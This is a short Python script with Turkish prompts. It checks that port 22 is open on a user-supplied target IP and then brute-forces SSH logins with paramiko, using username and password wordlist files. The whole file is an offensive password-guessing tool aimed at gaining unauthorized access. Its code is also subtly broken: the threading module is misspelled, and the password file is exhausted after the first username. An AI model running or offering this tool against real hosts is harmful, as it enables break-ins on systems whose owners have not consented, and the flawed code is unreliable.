import socket  
from colorama import Fore  
import paramiko  
import threading  

ip = input("Hedef İp Giriniz : ")
port = 22

def port_tara(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.25)
        s.connect((ip, port))
        print(Fore.GREEN + "{} [√] portu açık. Lütfen Bekleyin...".format(port))
        s.close()
    except socket.error:
        print(Fore.RED + "{} [×] portu kapalı. Tool'dan çıkılıyor...".format(port))
        exit()
        
        
usernamelist = input("SSH kullanıcı adı wordlistini giriniz: ")
passwordlist = input("SSH şifre wordlistini giriniz: ")

def ssh_brute():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(usernamelist, 'r') as users:
        with open(passwordlist, 'r') as passwords:
            for username in users:
                username = username.strip() 
                for password in passwords:
                    password = password.strip()
                    try:
                        ssh.connect(hostname=ip, port=port, username=username, password=password)
                        print(Fore.GREEN + "[✓] Başarılı. Şifre ve Kullanıcı adı Bulundu ", "Kullanıcı Adı:", username, "Şifre:", password)
                        ssh.close()
                        return
                    except paramiko.AuthenticationException:
                        print(Fore.RED + "[×] Başarısız Kullanıcı adı ve Şifre Bulunamadı")
                    except paramiko.SSHException as e:
                        print(Fore.RED + f"[×] SSH bağlantı hatası: {e}")
                        
                        
port_tara(ip, port)
start = therading.Thread(target=ssh_brute)
start.start()
                  
